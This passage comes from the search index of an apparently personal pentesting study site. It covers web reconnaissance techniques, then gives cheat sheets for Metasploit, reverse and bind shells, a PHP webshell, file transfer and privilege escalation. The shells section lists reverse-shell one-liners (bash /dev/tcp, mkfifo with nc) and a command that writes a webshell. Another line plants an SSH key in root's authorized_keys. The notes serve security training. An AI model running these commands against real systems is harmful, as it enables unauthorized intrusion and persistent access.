reconnaissance.</p>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Web%20Crawling%20%28Theory%29/#how-web-crawlers-work","title":"How Web Crawlers Work","text":"<p>The basic operation of a web crawler is straightforward yet powerful. It starts with a seed URL, which is the initial web page to crawl. The crawler fetches this page, parses its content, and extracts all its links. It then adds these links to a queue and crawls them, repeating the process iteratively. Depending on its scope and configuration, the crawler can explore an entire website or even a vast portion of the web.</p> <ol> <li> <p><code>Homepage</code>: You start with the homepage containing <code>link1</code>, <code>link2</code>, and <code>link3</code>.</p> <p>Code: txt</p> <pre><code>Homepage\n\u251c\u2500\u2500 link1\n\u251c\u2500\u2500 link2\n\u2514\u2500\u2500 link3\n</code></pre> </li> <li> <p><code>Visiting link1</code>: Visiting <code>link1</code> shows the homepage, <code>link2</code>, and also <code>link4</code> and <code>link5</code>.</p> <p>Code: txt</p> <pre><code>link1 Page\n\u251c\u2500\u2500 Homepage\n\u251c\u2500\u2500 link2\n\u251c\u2500\u2500 link4\n\u2514\u2500\u2500 link5\n</code></pre> </li> <li> <p><code>Continuing the Crawl</code>: The crawler continues to follow these links systematically, gathering all accessible pages and their links.</p> </li> </ol> <p>This example illustrates how a web crawler discovers and collects information by systematically following links, distinguishing it from fuzzing which involves guessing potential links.</p> <p>There are two primary types of crawling strategies.</p>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Web%20Crawling%20%28Theory%29/#breadth-first-crawling","title":"Breadth-First Crawling","text":"<p><code>Breadth-first crawling</code> prioritizes exploring a website's width before going deep. It starts by crawling all the links on the seed page, then moves on to the links on those pages, and so on. This is useful for getting a broad overview of a website's structure and content.</p>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Web%20Crawling%20%28Theory%29/#depth-first-crawling","title":"Depth-First Crawling","text":"<p>In contrast, <code>depth-first crawling</code> prioritizes depth over breadth. It follows a single path of links as far as possible before backtracking and exploring other paths. This can be useful for finding specific content or reaching deep into a website's structure.</p> <p>The choice of strategy depends on the specific goals of the crawling process.</p>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Web%20Crawling%20%28Theory%29/#extracting-valuable-information","title":"Extracting Valuable Information","text":"<p>Crawlers can extract a diverse array of data, each serving a specific purpose in the reconnaissance process:</p> <ul> <li><code>Links (Internal and External)</code>: These are the fundamental building blocks of the web, connecting pages within a website (<code>internal links</code>) and to other websites (<code>external links</code>). Crawlers meticulously collect these links, allowing you to map out a website's structure, discover hidden pages, and identify relationships with external resources.</li> <li><code>Comments</code>: Comments sections on blogs, forums, or other interactive pages can be a goldmine of information. Users often inadvertently reveal sensitive details, internal processes, or hints of vulnerabilities in their comments.</li> <li><code>Metadata</code>: Metadata refers to <code>data about data</code>. In the context of web pages, it includes information like page titles, descriptions, keywords, author names, and dates. This metadata can provide valuable context about a page's content, purpose, and relevance to your reconnaissance goals.</li> <li><code>Sensitive Files</code>: Web crawlers can be configured to actively search for sensitive files that might be inadvertently exposed on a website. This includes <code>backup files</code> (e.g., <code>.bak</code>, <code>.old</code>), <code>configuration files</code> (e.g., <code>web.config</code>, <code>settings.php</code>), <code>log files</code> (e.g., <code>error_log</code>, <code>access_log</code>), and other files containing passwords, <code>API keys</code>, or other confidential information. Carefully examining the extracted files, especially backup and configuration files, can reveal a trove of sensitive information, such as <code>database credentials</code>, <code>encryption keys</code>, or even source code snippets.</li> </ul>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Web%20Crawling%20%28Theory%29/#the-importance-of-context","title":"The Importance of Context","text":"<p>Understanding the context surrounding the extracted data is paramount.</p> <p>A single piece of information, like a comment mentioning a specific software version, might not seem significant on its own. However, when combined with other findings\u2014such as an outdated version listed in metadata or a potentially vulnerable configuration file discovered through crawling\u2014it can transform into a critical indicator of a potential vulnerability.</p> <p>The true value of extracted data lies in connecting the dots and constructing a comprehensive picture of the target's digital landscape.</p> <p>For instance, a list of extracted links might initially appear mundane. But upon closer examination, you notice a pattern: several URLs point to a directory named <code>/files/</code>. This triggers your curiosity, and you decide to manually visit the directory. To your surprise, you find that directory browsing is enabled, exposing a host of files, including backup archives, internal documents, and potentially sensitive data. This discovery wouldn't have been possible by merely looking at individual links in isolation; the contextual analysis led you to this critical finding.</p> <p>Similarly, seemingly innocuous comments can gain significance when correlated with other discoveries. A comment mentioning a \"file server\" might not raise any red flags initially. However, when combined with the aforementioned discovery of the <code>/files/</code> directory, it reinforces the possibility that the file server is publicly accessible, potentially exposing sensitive information or confidential data.</p> <p>Therefore, it's essential to approach data analysis holistically, considering the relationships between different data points and their potential implications for your reconnaissance goals.</p>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Well-Known%20URIs/","title":"Well Known URIs","text":"<p>The <code>.well-known</code> standard, defined in RFC 8615, serves as a standardized directory within a website's root domain. This designated location, typically accessible via the <code>/.well-known/</code> path on a web server, centralizes a website's critical metadata, including configuration files and information related to its services, protocols, and security mechanisms.</p> <p>By establishing a consistent location for such data, <code>.well-known</code> simplifies the discovery and access process for various stakeholders, including web browsers, applications, and security tools. This streamlined approach enables clients to automatically locate and retrieve specific configuration files by constructing the appropriate URL. For instance, to access a website's security policy, a client would request <code>https://example.com/.well-known/security.txt</code>.</p> <p>The <code>Internet Assigned Numbers Authority</code> (<code>IANA</code>) maintains a registry of <code>.well-known</code> URIs, each serving a specific purpose defined by various specifications and standards. Below is a table highlighting a few notable examples:</p> URI Suffix Description Status Reference <code>security.txt</code> Contains contact information for security researchers to report vulnerabilities. Permanent RFC 9116 <code>/.well-known/change-password</code> Provides a standard URL for directing users to a password change page. Provisional https://w3c.github.io/webappsec-change-password-url/#the-change-password-well-known-uri <code>openid-configuration</code> Defines configuration details for OpenID Connect, an identity layer on top of the OAuth 2.0 protocol. Permanent http://openid.net/specs/openid-connect-discovery-1_0.html <code>assetlinks.json</code> Used for verifying ownership of digital assets (e.g., apps) associated with a domain. Permanent https://github.com/google/digitalassetlinks/blob/master/well-known/specification.md <code>mta-sts.txt</code> Specifies the policy for SMTP MTA Strict Transport Security (MTA-STS) to enhance email security. Permanent RFC 8461 <p>This is just a small sample of the many <code>.well-known</code> URIs registered with IANA. Each entry in the registry offers specific guidelines and requirements for implementation, ensuring a standardized approach to leveraging the <code>.well-known</code> mechanism for various applications.</p>"},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Active/Well-Known%20URIs/#web-recon-and-well-known","title":"Web Recon and .well-known","text":"<p>In web recon, the <code>.well-known</code> URIs can be invaluable for discovering endpoints and configuration details that can be further tested during a penetration test. One particularly useful URI is <code>openid-configuration</code>.</p> <p>The <code>openid-configuration</code> URI is part of the OpenID Connect Discovery protocol, an identity layer built on top of the OAuth 2.0 protocol. When a client application wants to use OpenID Connect for authentication, it can retrieve the OpenID Connect Provider's configuration by accessing the <code>https://example.com/.well-known/openid-configuration</code> endpoint. This endpoint returns a JSON document containing metadata about the provider's endpoints, supported authentication methods, token issuance, and more:</p> <p>Code: json</p> <pre><code>{\n  \"issuer\": \"https://example.com\",\n  \"authorization_endpoint\": \"https://example.com/oauth2/authorize\",\n  \"token_endpoint\": \"https://example.com/oauth2/token\",\n  \"userinfo_endpoint\": \"https://example.com/oauth2/userinfo\",\n  \"jwks_uri\": \"https://example.com/oauth2/jwks\",\n  \"response_types_supported\": [\"code\", \"token\", \"id_token\"],\n  \"subject_types_supported\": [\"public\"],\n  \"id_token_signing_alg_values_supported\": [\"RS256\"],\n  \"scopes_supported\": [\"openid\", \"profile\", \"email\"]\n}\n</code></pre> <p>The information obtained from the <code>openid-configuration</code> endpoint provides multiple exploration opportunities:</p> <ol> <li><code>Endpoint Discovery</code>:<ul> <li><code>Authorization Endpoint</code>: Identifying the URL for user authorization requests.</li> <li><code>Token Endpoint</code>: Finding the URL where tokens are issued.</li> <li><code>Userinfo Endpoint</code>: Locating the endpoint that provides user information.</li> </ul> </li> <li><code>JWKS URI</code>: The <code>jwks_uri</code> reveals the <code>JSON Web Key Set</code> (<code>JWKS</code>), detailing the cryptographic keys used by the server.</li> <li><code>Supported Scopes and Response Types</code>: Understanding which scopes and response types are supported helps in mapping out the functionality and limitations of the OpenID Connect implementation.</li> <li><code>Algorithm Details</code>: Information about supported signing algorithms can be crucial for understanding the security measures in place.</li> </ol> <p>Exploring the IANA Registry and experimenting with the various <code>.well-known</code> URIs is an invaluable approach to uncovering additional web reconnaissance opportunities. As demonstrated with the <code>openid-configuration</code> endpoint above, these standardized URIs provide structured access to critical metadata and configuration details, enabling security professionals to comprehensively map out a website's security landscape.</p>"},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Passive/Certificate%20Transparency%20%28CT%29%20Logs/","title":"Certificate Transparency (CT) Logs","text":"<p>Certificate Transparency (CT) logs offer a treasure trove of subdomain information for passive reconnaissance. These publicly accessible logs record SSL/TLS certificates issued for domains and their subdomains, serving as a security measure to prevent fraudulent certificates. For reconnaissance, they offer a window into potentially overlooked subdomains.</p> <p>The <code>crt.sh</code> website provides a searchable interface for CT logs. To efficiently extract subdomains using <code>crt.sh</code> within your terminal, you can use a command like this:</p> <pre><code>curl -s \"https://crt.sh/?q=%25.example.com&amp;output=json\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u\n</code></pre> <p>This command fetches JSON-formatted data from <code>crt.sh</code> for <code>example.com</code> (the <code>%</code> is a wildcard), extracts domain names using <code>jq</code>, removes any wildcard prefixes (<code>*.</code>) with <code>sed</code>, and finally sorts and deduplicates the results.</p>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Passive/Certificate%20Transparency%20%28CT%29%20Logs/#how-certificate-transparency-logs-work","title":"How Certificate Transparency Logs Work","text":"<p>Certificate Transparency logs rely on a clever combination of cryptographic techniques and public accountability:</p> <ol> <li><code>Certificate Issuance</code>: When a website owner requests an <code>SSL/TLS certificate</code> from a <code>Certificate Authority (CA)</code>, the CA performs due diligence to verify the owner's identity and domain ownership. Once verified, the CA issues a <code>pre-certificate</code>, a preliminary certificate version.</li> <li><code>Log Submission</code>: The CA then submits this <code>pre-certificate</code> to multiple CT logs. Each log is operated by a different organisation, ensuring redundancy and decentralisation. The logs are essentially <code>append-only</code>, meaning that once a certificate is added, it cannot be modified or deleted, ensuring the integrity of the historical record.</li> <li><code>Signed Certificate Timestamp (SCT)</code>: Upon receiving the <code>pre-certificate</code>, each CT log generates a <code>Signed Certificate Timestamp (SCT)</code>. This <code>SCT</code> is a cryptographic proof that the certificate was submitted to the log at a specific time. The <code>SCT</code> is then included in the final certificate issued to the website owner.</li> <li><code>Browser Verification</code>: When a user's browser connects to a website, it checks the certificate's <code>SCTs</code>. These <code>SCTs</code> are verified against the public CT logs to confirm that the certificate was issued and logged correctly. If the <code>SCTs</code> are valid, the browser establishes a secure connection; if not, it may display a warning to the user.</li> <li><code>Monitoring and Auditing</code>: CT logs are continuously monitored by various entities, including security researchers, website owners, and <code>browser vendors</code>. These monitors look for anomalies or suspicious certificates, such as those issued for domains they don't own or certificates violating industry standards. If any issues are found, they can be reported to the relevant <code>CA</code> for investigation and potential revocation of the certificate.</li> </ol>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Passive/Certificate%20Transparency%20%28CT%29%20Logs/#the-merkle-tree-structure","title":"The Merkle Tree Structure","text":"<p>To ensure CT logs' integrity and tamper-proof nature, they employ a Merkle tree cryptographic structure. This structure organises the certificates in a tree-like fashion, where each leaf node represents a certificate, and each non-leaf node represents a hash of its child nodes. The root of the tree, known as the Merkle root, is a single hash representing the entire log.</p> <p>Let's visualise this with a hypothetical Merkle tree for <code>inlanefreight.com</code>:</p> <p></p> <p>In this hypothetical tree:</p> <ul> <li><code>Root Hash</code>: The topmost node, a single hash representing the entire log's state.</li> <li><code>Hash 1 &amp; Hash 2</code>: Intermediate nodes, each a hash of two child nodes (either certificates or other hashes).</li> <li><code>Cert 1 - Cert 4</code>: Leaf nodes representing individual SSL/TLS certificates for different subdomains of <code>inlanefreight.com</code>.</li> </ul> <p>This structure allows for efficient verification of any certificate in the log. By providing the Merkle path (a series of hashes) for a particular certificate, anyone can verify that it is included in the log without downloading the entire log. For instance, to verify <code>Cert 2 (blog.inlanefreight.com)</code>, you would need:</p> <ol> <li><code>Cert 2's hash</code>: This directly verifies the certificate itself.</li> <li><code>Hash 1</code>: Verifies that Cert 2's hash is correctly paired with Cert 1's hash.</li> <li><code>Root Hash</code>: Confirms that Hash 1 is a valid part of the overall log structure.</li> </ol> <p>This process ensures that even if a single bit of data in a certificate or the log itself is altered, the root hash will change, immediately signaling tampering. This makes CT logs an invaluable tool for maintaining the integrity and trustworthiness of SSL/TLS certificates, ultimately enhancing internet security.</p>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Passive/Certificate%20Transparency%20%28CT%29%20Logs/#ct-logs-and-web-recon","title":"CT Logs and Web Recon","text":"<p>Certificate Transparency logs offer a unique advantage in subdomain enumeration compared to other methods. Unlike brute-forcing or wordlist-based approaches, which rely on guessing or predicting subdomain names, CT logs provide a definitive record of certificates issued for a domain and its subdomains. This means you're not limited by the scope of your wordlist or the effectiveness of your brute-forcing algorithm. Instead, you gain access to a historical and comprehensive view of a domain's subdomains, including those that might not be actively used or easily guessable.</p> <p>Furthermore, CT logs can unveil subdomains associated with old or expired certificates. These subdomains might host outdated software or configurations, making them potentially vulnerable to exploitation.</p> <p>In essence, CT logs provide a reliable and efficient way to discover subdomains without the need for exhaustive brute-forcing or relying on the completeness of wordlists. They offer a unique window into a domain's history and can reveal subdomains that might otherwise remain hidden, significantly enhancing your reconnaissance capabilities.</p>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Passive/Certificate%20Transparency%20%28CT%29%20Logs/#searching-ct-logs","title":"Searching CT Logs","text":"<p>There are two popular options for searching CT logs:</p> Tool Key Features Use Cases Pros Cons crt.sh User-friendly web interface, simple search by domain, displays certificate details, SAN entries. Quick and easy searches, identifying subdomains, checking certificate issuance history. Free, easy to use, no registration required. Limited filtering and analysis options. Censys Powerful search engine for internet-connected devices, advanced filtering by domain, IP, certificate attributes. In-depth analysis of certificates, identifying misconfigurations, finding related certificates and hosts. Extensive data and filtering options, API access. Requires registration (free tier available).","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Passive/Certificate%20Transparency%20%28CT%29%20Logs/#crtsh-lookup","title":"crt.sh lookup","text":"<p>While <code>crt.sh</code> offers a convenient web interface, you can also leverage its API for automated searches directly from your terminal. Let's see how to find all 'dev' subdomains on <code>facebook.com</code> using <code>curl</code> and <code>jq</code>:</p> <p>Certificate Transparency Logs</p> <pre><code>arenwald@htb[/htb]$ curl -s \"https://crt.sh/?q=facebook.com&amp;output=json\" | jq -r '.[]\n | select(.name_value | contains(\"dev\")) | .name_value' | sort -u\n\n*.dev.facebook.com\n*.newdev.facebook.com\n*.secure.dev.facebook.com\ndev.facebook.com\ndevvm1958.ftw3.facebook.com\nfacebook-amex-dev.facebook.com\nfacebook-amex-sign-enc-dev.facebook.com\nnewdev.facebook.com\nsecure.dev.facebook.com\n</code></pre> <ul> <li><code>curl -s \"https://crt.sh/?q=facebook.com&amp;output=json\"</code>: This command fetches the JSON output from crt.sh for certificates matching the domain <code>facebook.com</code>.</li> <li><code>jq -r '.[] | select(.name_value | contains(\"dev\")) | .name_value'</code>: This part filters the JSON results, selecting only entries where the <code>name_value</code> field (which contains the domain or subdomain) includes the string \"<code>dev.</code>\" The <code>-r</code> flag tells <code>jq</code> to output raw strings.</li> <li><code>sort -u</code>: This sorts the results alphabetically and removes duplicates.</li> </ul>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Passive/Google%20Dorking/","title":"Google Dorking","text":"<p>Leveraging search engines for reconnaissance involves utilizing their vast indexes of web content to uncover information about your target. This passive technique, often referred to as Open Source Intelligence (OSINT) gathering, can yield valuable insights without directly interacting with the target's systems.</p> <p>By employing advanced search operators and specialized queries known as \"Google Dorks,\" you can pinpoint specific information buried within search results. Here's a table of some useful search operators for web reconnaissance:</p> Operator Description Example <code>site:</code> Restricts search results to a specific website. <code>site:example.com \"password reset\"</code> <code>inurl:</code> Searches for a specific term in the URL of a page. <code>inurl:admin login</code> <code>filetype:</code> Limits results to files of a specific type. <code>filetype:pdf \"confidential report\"</code> <code>intitle:</code> Searches for a term within the title of a page. <code>intitle:\"index of\" /backup</code> <code>cache:</code> Shows the cached version of a webpage. <code>cache:example.com</code> <code>\"search term\"</code> Searches for the exact phrase within quotation marks. <code>\"internal error\" site:example.com</code> <code>OR</code> Combines multiple search terms. <code>inurl:admin OR inurl:login</code> <code>-</code> Excludes specific terms from search results. <code>inurl:admin -intext:wordpress</code> <p>By creatively combining these operators and crafting targeted queries, you can uncover sensitive documents, exposed directories, login pages, and other valuable information that may aid in your reconnaissance efforts.</p>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Passive/WHOIS/","title":"WHOIS","text":"<p>WHOIS is a widely used query and response protocol designed to access databases that store information about registered internet resources. Primarily associated with domain names, WHOIS can also provide details about IP address blocks and autonomous systems. Think of it as a giant phonebook for the internet, letting you look up who owns or is responsible for various online assets.</p> <pre><code>arenwald@htb[/htb]$ whois inlanefreight.com\n\n[...]\nDomain Name: inlanefreight.com\nRegistry Domain ID: 2420436757_DOMAIN_COM-VRSN\nRegistrar WHOIS Server: whois.registrar.amazon\nRegistrar URL: https://registrar.amazon.com\nUpdated Date: 2023-07-03T01:11:15Z\nCreation Date: 2019-08-05T22:43:09Z\n[...]\n</code></pre> <p>Each WHOIS record typically contains the following information:</p> <ul> <li><code>Domain Name</code>: The domain name itself (e.g., example.com)</li> <li><code>Registrar</code>: The company where the domain was registered (e.g., GoDaddy, Namecheap)</li> <li><code>Registrant Contact</code>: The person or organization that registered the domain.</li> <li><code>Administrative Contact</code>: The person responsible for managing the domain.</li> <li><code>Technical Contact</code>: The person handling technical issues related to the domain.</li> <li><code>Creation and Expiration Dates</code>: When the domain was registered and when it's set to expire.</li> <li><code>Name Servers</code>: Servers that translate the domain name into an IP address.</li> </ul>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Passive/WHOIS/#why-whois-matters-for-web-recon","title":"Why WHOIS Matters for Web Recon","text":"<p>WHOIS data serves as a treasure trove of information for penetration testers during the reconnaissance phase of an assessment. It offers valuable insights into the target organisation's digital footprint and potential vulnerabilities:</p> <ul> <li><code>Identifying Key Personnel</code>: WHOIS records often reveal the names, email addresses, and phone numbers of individuals responsible for managing the domain. This information can be leveraged for social engineering attacks or to identify potential targets for phishing campaigns.</li> <li><code>Discovering Network Infrastructure</code>: Technical details like name servers and IP addresses provide clues about the target's network infrastructure. This can help penetration testers identify potential entry points or misconfigurations.</li> <li><code>Historical Data Analysis</code>: Accessing historical WHOIS records through services like WhoisFreaks can reveal changes in ownership, contact information, or technical details over time. This can be useful for tracking the evolution of the target's digital presence.</li> </ul>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Passive/WHOIS/#example","title":"Example","text":"<p>The WHOIS output for <code>facebook.com</code> reveals several key details:</p> <ol> <li> <p><code>Domain Registration</code>:</p> <ul> <li><code>Registrar</code>: RegistrarSafe, LLC</li> <li><code>Creation Date</code>: 1997-03-29</li> <li><code>Expiry Date</code>: 2033-03-30</li> </ul> <p>These details indicate that the domain is registered with RegistrarSafe, LLC, and has been active for a considerable period, suggesting its legitimacy and established online presence. The distant expiry date further reinforces its longevity.</p> </li> <li> <p><code>Domain Owner</code>:</p> <ul> <li><code>Registrant/Admin/Tech Organization</code>: Meta Platforms, Inc.</li> <li><code>Registrant/Admin/Tech Contact</code>: Domain Admin</li> </ul> <p>This information identifies Meta Platforms, Inc. as the organization behind <code>facebook.com</code>, and \"Domain Admin\" as the point of contact for domain-related matters. This is consistent with the expectation that Facebook, a prominent social media platform, is owned by Meta Platforms, Inc.</p> </li> <li> <p><code>Domain Status</code>:</p> <ul> <li><code>clientDeleteProhibited</code>, <code>clientTransferProhibited</code>, <code>clientUpdateProhibited</code>, <code>serverDeleteProhibited</code>, <code>serverTransferProhibited</code>, and <code>serverUpdateProhibited</code></li> </ul> <p>These statuses indicate that the domain is protected against unauthorized changes, transfers, or deletions on both the client and server sides. This highlights a strong emphasis on security and control over the domain.</p> </li> <li> <p><code>Name Servers</code>:</p> <ul> <li><code>A.NS.FACEBOOK.COM</code>, <code>B.NS.FACEBOOK.COM</code>, <code>C.NS.FACEBOOK.COM</code>, <code>D.NS.FACEBOOK.COM</code></li> </ul> <p>These name servers are all within the <code>facebook.com</code> domain, suggesting that Meta Platforms, Inc. manages its DNS infrastructure. It is common practice for large organizations to maintain control and reliability over their DNS resolution.</p> </li> </ol>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/1.%20Information%20Gathering/Web%20Enumeration/Passive/Web%20Archives/","title":"Web Archives","text":"<p>Web archives are digital repositories that store snapshots of websites across time, providing a historical record of their evolution. Among these archives, the Wayback Machine is the most comprehensive and accessible resource for web reconnaissance.</p> <p>The Wayback Machine, a project by the Internet Archive, has been archiving the web for over two decades, capturing billions of web pages from across the globe. This massive historical data collection can be an invaluable resource for security researchers and investigators.</p> Feature Description Use Case in Reconnaissance <code>Historical Snapshots</code> View past versions of websites, including pages, content, and design changes. Identify past website content or functionality that is no longer available. <code>Hidden Directories</code> Explore directories and files that may have been removed or hidden from the current version of the website. Discover sensitive information or backups that were inadvertently left accessible in previous versions. <code>Content Changes</code> Track changes in website content, including text, images, and links. Identify patterns in content updates and assess the evolution of a website's security posture. <p>By leveraging the Wayback Machine, you can gain a historical perspective on your target's online presence, potentially revealing vulnerabilities that may have been overlooked in the current version of the website.</p>","tags":["Pentesting","Information_Gathering","Web_Enumeration"]},{"location":"Pentesting/2.%20Pre-Exploitation/Public%20Exploits/","title":"Public Exploits","text":"Public Exploits <code>searchsploit openssh 7.2</code> Search for public exploits for a web application <code>msfconsole</code> MSF: Start the Metasploit Framework <code>search exploit eternalblue</code> MSF: Search for public exploits in MSF <code>use exploit/windows/smb/ms17_010_psexec</code> MSF: Start using an MSF module <code>show options</code> MSF: Show required options for an MSF module <code>set RHOSTS 10.10.10.40</code> MSF: Set a value for an MSF module option <code>check</code> MSF: Test if the target server is vulnerable <code>exploit</code> MSF: Run the exploit on the target server is vulnerable"},{"location":"Pentesting/2.%20Pre-Exploitation/Shells/HTB%20Shells%20Cheatsheet/","title":"HTB Shells Cheatsheet","text":"Using Shells <code>nc -lvnp 1234</code> Start a\u00a0<code>nc</code>\u00a0listener on a local port <code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1'</code> Send a reverse shell from the remote server <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/sh -i 2&gt;&amp;1\\|nc 10.10.10.10 1234 &gt;/tmp/f</code> Another command to send a reverse shell from the remote server <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/bash -i 2&gt;&amp;1\\|nc -lvp 1234 &gt;/tmp/f</code> Start a bind shell on the remote server <code>nc 10.10.10.1 1234</code> Connect to a bind shell started on the remote server <code>python -c 'import pty; pty.spawn(\"/bin/bash\")'</code> Upgrade shell TTY (1) <code>ctrl+z</code>\u00a0then\u00a0<code>stty raw -echo</code>\u00a0then\u00a0<code>fg</code>\u00a0then\u00a0<code>enter</code>\u00a0twice Upgrade shell TTY (2) <code>echo \"&lt;?php system(\\$_GET['cmd']);?&gt;\" &gt; /var/www/html/shell.php</code> Create a webshell php file <code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code> Execute a command on an uploaded webshell"},{"location":"Pentesting/5.%20Post-Exploitation/Fully%20Interactive%20TTY/","title":"Fully Interactive TTY","text":"<code>python -c 'import pty; pty.spawn(\"/bin/bash\")'</code> Upgrade shell TTY (1) <code>ctrl+z</code> then <code>stty raw -echo</code> then <code>fg</code> then <code>enter</code> twice Upgrade shell TTY (2)"},{"location":"Pentesting/5.%20Post-Exploitation/Linux%20Post%20Exploitation/File%20Transfer/HTB%20File%20Transfer%20Cheatsheet/","title":"HTB File Transfer Cheatsheet","text":"Transferring Files <code>python3 -m http.server 8000</code> Start a local webserver <code>wget http://10.10.14.1:8000/linpeas.sh</code> Download a file on the remote server from our local machine <code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code> Download a file on the remote server from our local machine <code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code> Transfer a file to the remote server with\u00a0<code>scp</code>\u00a0(requires SSH access) <code>base64 shell -w 0</code> Convert a file to\u00a0<code>base64</code> <code>echo f0VMR...SNIO...InmDwU \\| base64 -d &gt; shell</code> Convert a file from\u00a0<code>base64</code>\u00a0back to its orig <code>md5sum shell</code> Check the file's\u00a0<code>md5sum</code>\u00a0to ensure it converted correctly"},{"location":"Pentesting/5.%20Post-Exploitation/Linux%20Post%20Exploitation/Privilege%20Escalation/HTB%20PrivEsc%20Cheatsheet/","title":"HTB PrivEsc Cheatsheet","text":"Privilege Escalation <code>./linpeas.sh</code> Run\u00a0<code>linpeas</code>\u00a0script to enumerate remote server <code>sudo -l</code> List available\u00a0<code>sudo</code>\u00a0privileges <code>sudo -u user /bin/echo Hello World!</code> Run a command with\u00a0<code>sudo</code> <code>sudo su -</code> Switch to root user (if we have access to\u00a0<code>sudo su</code>) <code>sudo su user -</code> Switch to a user (if we have access to\u00a0<code>sudo su</code>) <code>ssh-keygen -f key</code> Create a new SSH key <code>echo \"ssh-rsa AAAAB...SNIP...M= user@parrot\" &gt;&gt; /root/.ssh/authorized_keys</code> Add the generated public key to the user <code>ssh\u00a0root@10.10.10.10\u00a0-i key</code> SSH to the server with the generated private key"},{"location":"Pentesting/Tools/Tmux/","title":"Tmux","text":"<code>tmux</code> Start tmux <code>ctrl+b</code> tmux: default prefix <code>prefix c</code> tmux: new window <code>prefix 1</code> tmux: switch to window (<code>1</code>) <code>prefix shift+%</code> tmux: split pane vertically <code>prefix shift+\"</code> tmux: split pane horizontally <code>prefix -&gt;</code> tmux: switch to the right pane","tags":["Tools","Tmux"]},{"location":"Pentesting/Tools/Vim/","title":"Vim","text":"Vim <code>vim file</code> vim: open\u00a0<code>file</code>\u00a0with vim <code>esc+i</code> vim: enter\u00a0<code>insert</code>\u00a0mode <code>esc</code> vim: back to\u00a0<code>normal</code>\u00a0mode <code>x</code> vim: Cut character <code>dw</code> vim: Cut word <code>dd</code> vim: Cut full line <code>yw</code> vim: Copy word <code>yy</code> vim: Copy full line <code>p</code> vim: Paste <code>:1</code> vim: Go to line number 1. <code>:w</code> vim: Write the file 'i.e. save' <code>:q</code> vim: Quit <code>:q!</code> vim: Quit without saving <code>:wq</code> vim: Write and quit","tags":["Tools","Vim"]},{"location":"Programming/Useful%20Links/","title":"Useful Links","text":"<p>Malcore - The Begining: https://bible.malcore.io/readme/the-beginning</p>"},{"location":"Programming/Assembly/Assembly%20and%20Dissassembly/","title":"Assembly and Dissassembly","text":"Command Description <code>nasm -f elf64 helloWorld.s</code> Assemble code <code>ld -o helloWorld helloWorld.o</code> Link code <code>ld -o fib fib.o -lc --dynamic-linker /lib64/ld-linux-x86-64.so.2</code> Link code with libc functions <code>objdump -M intel -d helloWorld</code> Disassemble <code>.text</code> section <code>objdump -M intel --no-show-raw-insn --no-addresses -d helloWorld</code> Show binary assembly code <code>objdump -sj .data helloWorld</code> Disassemble <code>.data</code> section Bash script to make assemble and link assembly files : <pre><code>#!/bin/bash\n\nfileName=\"${1%%.*}\" # remove .s extension\n\nnasm -f elf64 ${fileName}\".s\"\nld ${fileName}\".o\" -o ${fileName}\n[ \"$2\" == \"-g\" ] &amp;&amp; gdb -q ${fileName} || ./${fileName}\n</code></pre> <p>For debugging : </p> <pre><code>Arenwald@htb[/htb]$ ./assembler.sh helloWorld.s -g\n...SNIP...\ngef\u27a4\n</code></pre>"},{"location":"Programming/Assembly/Assembly%20and%20Dissassembly/#info","title":"Info","text":"<p>Once <code>GDB</code> is started, we can use the <code>info</code> command to view general information about the program, like its functions or variables.</p> <p>Tip: If we want to understand how any command runs within <code>GDB</code>, we can use the <code>help CMD</code> command to get its documentation. For example, we can try executing <code>help info</code></p>"},{"location":"Programming/Assembly/Assembly%20and%20Dissassembly/#functions","title":"Functions","text":"<p>To start, we will use the <code>info</code> command to check which <code>functions</code> are defined within the binary:</p> <p>GNU Debugger (GDB)</p> <pre><code>gef\u27a4  info functions\n\nAll defined functions:\n\nNon-debugging symbols:\n0x0000000000401000  _start\n</code></pre> <p>As we can see, we found our main <code>_start</code> function.</p>"},{"location":"Programming/Assembly/Assembly%20and%20Dissassembly/#variables","title":"Variables","text":"<p>We can also use the <code>info variables</code> command to view all available variables within the program:</p> <p>GNU Debugger (GDB)</p> <pre><code>gef\u27a4  info variables\n\nAll defined 